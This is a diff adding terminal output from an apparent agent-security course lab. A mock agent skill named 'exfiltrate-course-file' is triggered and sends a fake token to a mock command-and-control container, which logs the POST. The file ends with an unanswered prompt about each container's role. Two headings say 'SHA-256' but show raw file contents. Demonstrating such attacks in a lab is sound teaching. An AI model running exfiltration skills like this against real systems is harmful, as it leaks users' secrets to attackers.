@@ -1,0 +1,100 @@
+Output of docker compose ps:
+melissa-ordonez@melissa-ordonez-VirtualBox:~/.openclaw/workspace/Documents/csce465-agentsec/hw4$ docker compose ps
+NAME         IMAGE            COMMAND                  SERVICE      CREATED          STATUS          PORTS
+agent-node   hw4-agent-node   "sleep infinity"         agent-node   22 minutes ago   Up 22 minutes   
+mock-c2      hw4-mock-c2      "python3 /app/c2.py"     mock-c2      22 minutes ago   Up 54 seconds   
+web-lab      hw4-web-lab      "python3 -m http.ser…"   web-lab      22 minutes ago   Up 22 minutes   
+
+Output of docker network inspect:
+melissa-ordonez@melissa-ordonez-VirtualBox:~/.openclaw/workspace/Documents/csce465-agentsec/hw4$ docker network inspect hw4_hw4net
+[
+    {
+        "Name": "hw4_hw4net",
+        "Id": "20b6eea5a642cfb6471b74d3a3351b7f36ccfbb16ca33b3ee236c9af16be40ad",
+        "Created": "2026-11-17T18:25:06.94790219-06:00",
+        "Scope": "local",
+        "Driver": "bridge",
+        "EnableIPv4": true,
+        "EnableIPv6": false,
+        "IPAM": {
+            "Driver": "default",
+            "Options": null,
+            "Config": [
+                {
+                    "Subnet": "172.30.0.0/24",
+                    "Gateway": "172.30.0.1"
+                }
+            ]
+        },
+        "Internal": false,
+        "Attachable": false,
+        "Ingress": false,
+        "ConfigFrom": {
+            "Network": ""
+        },
+        "ConfigOnly": false,
+        "Options": {
+            "com.docker.network.bridge.name": "br-hw4"
+        },
+        "Labels": {
+            "com.docker.compose.config-hash": "e580e00a8df4afa6daed1a5508d627bc60f2e78f7238f1a029114a04b5c41e3f",
+            "com.docker.compose.network": "hw4net",
+            "com.docker.compose.project": "hw4",
+            "com.docker.compose.version": "5.7.1"
+        },
+        "Containers": {
+            "5e266d17766ec8113e79d68dfe0c7511d2994f0478bdbf70b1d629e84051a939": {
+                "Name": "agent-node",
+                "EndpointID": "1454e98c450fc320ca1575d092d2a3f9718c52e4585b4b1456d81e095d9704d8",
+                "MacAddress": "8e:1a:31:80:08:c6",
+                "IPv4Address": "172.30.0.10/24",
+                "IPv6Address": ""
+            },
+            "6c8d9004dd06a7c5f9f4d35302f6ab237debae0444385e55cde7d6824434dd05": {
+                "Name": "web-lab",
+                "EndpointID": "7201da10b11e4ab85114f25c929e3e5e40c4700988621e06930a7b93c1fe10e0",
+                "MacAddress": "5e:58:60:71:dd:6a",
+                "IPv4Address": "172.30.0.40/24",
+                "IPv6Address": ""
+            },
+            "843f1474295f520d7f46a61d258555ce2cf26d6a40a844c073a891bb4000ba51": {
+                "Name": "mock-c2",
+                "EndpointID": "ee75f841fc0f1d91c9228d7a4b0f7f9356bc31b8bc035e770bf833e5cb4e344c",
+                "MacAddress": "0a:cd:66:ef:f3:0a",
+                "IPv4Address": "172.30.0.66/24",
+                "IPv6Address": ""
+            }
+        },
+        "Status": {
+            "IPAM": {
+                "Subnets": {
+                    "172.30.0.0/24": {
+                        "IPsInUse": 6,
+                        "DynamicIPsAvailable": 250
+                    }
+                }
+            }
+        }
+    }
+]
+
+Running mock skill with exact trigger:
+melissa-ordonez@melissa-ordonez-VirtualBox:~/.openclaw/workspace/Documents/csce465-agentsec/hw4$ docker compose exec agent-node /app/mock_skill.sh exfiltrate-course-file
+Mock file transfer completed.
+
+Logs from mock-c2 receiving file:
+melissa-ordonez@melissa-ordonez-VirtualBox:~/.openclaw/workspace/Documents/csce465-agentsec/hw4$ docker compose logs mock-c2
+mock-c2  | 172.30.0.10 - - [18/Nov/2026 00:48:38] "POST / HTTP/1.1" 204 -
+
+SHA-256 of /data/received.bin:
+melissa-ordonez@melissa-ordonez-VirtualBox:~/.openclaw/workspace/Documents/csce465-agentsec/hw4$ docker compose exec mock-c2 cat /data/received.bin
+CSCE465-FAKE-TOKEN-e8e56b9e4c164afc
+
+SHA-256 of fake_secrets.txt:
+melissa-ordonez@melissa-ordonez-VirtualBox:~/.openclaw/workspace/Documents/csce465-agentsec/hw4$ cat fake_secrets.txt
+CSCE465-FAKE-TOKEN-e8e56b9e4c164afc
+
+Explain what each container represents in the incident:
+
+
+
